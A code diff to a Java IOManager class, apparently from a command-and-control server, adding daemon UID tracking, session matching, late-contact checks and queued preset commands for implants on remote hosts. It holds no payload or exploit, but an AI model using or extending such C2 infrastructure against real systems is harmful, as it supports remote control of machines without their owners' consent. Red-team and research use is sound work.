@@ -81,7 +81,23 @@ public class IOManager {
 	}
 	
 	/**
-	* C2Interface implementations use these method to query the next command to be sent to connected daemons.
+	* C2Interface implementations use this method to indicate that a new daemon is facilitating this commanding
+	* pathway. 
+	*
+	* @param sessionId The Id of the session to check for a command
+	* @param daemonUID The new daemon's UID which will fulfill this command pathway roll
+	* @return with a String containing the next command, or null if no commands are available
+	*/
+	public synchronized void updateDaemonUID(int sessionId, String daemonUID) {
+		if(sessions.containsKey(sessionId)){
+			sessions.get(sessionId).updateDaemonUID(daemonUID);
+		}else{
+			throw new IllegalArgumentException("Invalid session id");
+		}
+	}
+	
+	/**
+	* C2Interface implementations use this method to query the next command to be sent to connected daemons.
 	* The C2Interface is responsible for determining what the applicable sessionId is prior to invocation 
 	*
 	* @param sessionId The Id of the session to check for a command
@@ -91,6 +107,75 @@ public class IOManager {
 		if(sessions.containsKey(sessionId)){
 			String command = sessions.get(sessionId).pollCommand(); 
 			return command;
+		}else{
+			throw new IllegalArgumentException("Invalid session id");
+		}
+	}
+	
+	/**
+	* C2Interface implementations use this method to query the current daemon UID associated with this
+	* session 
+	*
+	* @param sessionId The Id of the session 
+	* @return with a String containing the UID of the current daemon
+	*/
+	public synchronized String getDaemonUID(int sessionId) {
+		if(sessions.containsKey(sessionId)){
+			return sessions.get(sessionId).getDaemonUID(); 
+		}else{
+			throw new IllegalArgumentException("Invalid session id");
+		}
+	}
+	
+	public int determineAndGetCorrectSessionId(String hostname, String username, String protocol, String daemonUID) {
+		String sessionUID = hostname + ":" + username + ":" + protocol;
+		Integer sessionId = getSessionId(sessionUID);
+		if (sessionId == null) {
+			sessionId = addSession(username, hostname, protocol);
+			if (daemonUID != null) {
+				updateDaemonUID(sessionId, daemonUID);
+			}
+		}
+		if (daemonUID != null) {
+			if (!daemonUID.equals(getDaemonUID(sessionId))) {
+				if (isContactLate(sessionId)) {
+					updateDaemonUID(sessionId, daemonUID);
+				} else {
+					Integer candidateSessionId = getSessionId(sessionUID + ":" + daemonUID);
+					if (candidateSessionId == null) {
+						sessionId = addSession(username, hostname, protocol, daemonUID);
+					} else {
+						sessionId = candidateSessionId;
+					}
+				}
+			}
+		}
+		return sessionId;
+	}
+	
+	/**
+	* C2Interface implementations use this method to check if a session has not received a contact attempt
+	* within the expected interval. 
+	*
+	* @param sessionId The Id of the session
+	* @return whether other not contact is late
+	*/
+	private synchronized boolean isContactLate(int sessionId) {
+		if(sessions.containsKey(sessionId)){
+			return sessions.get(sessionId).isContactLate();
+		}else{
+			throw new IllegalArgumentException("Invalid session id");
+		}
+	}
+	
+	/**
+	* C2Interface implementations use this method notify that a session has had a successful contact attempt
+	*
+	* @param sessionId The Id of the session
+	*/
+	public void updateSessionContactTime(int sessionId){
+		if(sessions.containsKey(sessionId)){
+			sessions.get(sessionId).updateSessionContactTime();
 		}else{
 			throw new IllegalArgumentException("Invalid session id");
 		}
@@ -167,6 +252,61 @@ public class IOManager {
 		return new HashSet<Session>(sessions.values());
 	}
 	
+	private void checkForExistingSession(String sessionUid) {
+		for(Session session : sessions.values()) {
+			if(session.uid.contentEquals(sessionUid)) {
+				throw new IllegalArgumentException("Session Id Already Exists");
+			}
+		}
+	}
+	
+	private void sendPresetCommands(int sessionId, String username, String hostname) {
+		if(!cl.getDefaultCommands().isEmpty()) {
+			for(String cmd : cl.getDefaultCommands()) {
+				System.out.println("Add default cmd: " + cmd);
+				sendCommand(sessionId, cmd);
+			}
+		}
+		
+		
+		List<String> userCmds = cl.getUserCommands(username);
+		if(userCmds != null) {
+			for(String cmd : userCmds) {
+				System.out.println("Adding user cmd: " + cmd);
+				sendCommand(sessionId, cmd);
+			}
+		}
+		
+		List<String> hostCmds = cl.getHostCommands(hostname);
+		if(hostCmds != null) {
+			for(String cmd : hostCmds) {
+				System.out.println("Adding host cmd: " + cmd);
+				sendCommand(sessionId, cmd);
+			}
+		}
+	}
+	
+	/**
+	* C2Interface implementations use this method to add a new session and retrieve a session ID
+	* that can be used for further communication with the class. This method should only be used if there is
+	* not a prior session established with the same username, protocol, and hostname. 
+	*
+	* @param username The username of the connecting session
+	* @param hostname The hostname of the connecting session
+	* @param protocol The protocol of the connecting session
+	* @param daemonUID The UID presented by the daemon
+	* @return an int representing the registered session ID.
+	*/
+	public synchronized int addSession(String username, String hostname, String protocol, String daemonUID) {
+		checkForExistingSession(hostname + ":" + username + ":" + protocol + ":" + daemonUID);
+		int newSessionId = nextSessionId++;
+		sessions.put(newSessionId, new Session(newSessionId, hostname, username, protocol, daemonUID));
+		
+		sendPresetCommands(newSessionId, username, hostname);
+		
+		return newSessionId;
+	}
+	
 	/**
 	* C2Interface implementations use this method to add a new session and retrieve a session ID
 	* that can be used for further communication with the class. 
@@ -177,36 +317,11 @@ public class IOManager {
 	* @return an int representing the registered session ID.
 	*/
 	public synchronized int addSession(String username, String hostname, String protocol){
-		for(Session session : sessions.values()) {
-			if(session.uid.contentEquals(hostname + ":" + username + ":" + protocol)) {
-				throw new IllegalArgumentException("Session Id Already Exists");
-			}
-		}
+		checkForExistingSession(hostname + ":" + username + ":" + protocol);
 		int newSessionId = nextSessionId++;
 		sessions.put(newSessionId, new Session(newSessionId, hostname, username, protocol));
 		
-		if(!cl.getDefaultCommands().isEmpty()) {
-			for(String cmd : cl.getDefaultCommands()) {
-				System.out.println("Add default cmd: " + cmd);
-				sendCommand(newSessionId, cmd);
-			}
-		}
-		
-		List<String> userCmds = cl.getUserCommands(username);
-		if(userCmds != null) {
-			for(String cmd : userCmds) {
-				System.out.println("Adding user cmd: " + cmd);
-				sendCommand(newSessionId, cmd);
-			}
-		}
-		
-		List<String> hostCmds = cl.getHostCommands(hostname);
-		if(hostCmds != null) {
-			for(String cmd : hostCmds) {
-				System.out.println("Adding host cmd: " + cmd);
-				sendCommand(newSessionId, cmd);
-			}
-		}
+		sendPresetCommands(newSessionId, username, hostname);
 		
 		return newSessionId;
 	}
